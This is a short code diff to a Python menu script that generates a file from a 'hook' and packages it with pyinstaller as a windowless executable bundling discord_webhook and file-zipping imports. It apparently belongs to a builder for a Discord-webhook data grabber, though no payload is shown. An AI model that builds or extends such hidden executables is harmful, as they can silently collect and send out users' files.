@@ -34,12 +34,12 @@ def main():
     user_option = int(input("[Choose option]: "))
     
     if user_option == 1:
-        create_python_file(hook) #относитсься к if
-        print("   File 'generated_file.py' generated!") #относитсься к if
+        create_python_file(hook) 
+        print("   File 'generated_file.py' generated!") 
     if user_option == 2:
         os.system("pip install -r requirements.txt")
         os.system("pyinstaller --onefile --noconsole --hidden-import discord_webhook --hidden-import zip_files --hidden-import shutil generated_file.py")
-        print("   Coming soon!")
+        print("   Check dist folder!")
 
 def set_def_color():
     sys.stdout.write("\033[0m")
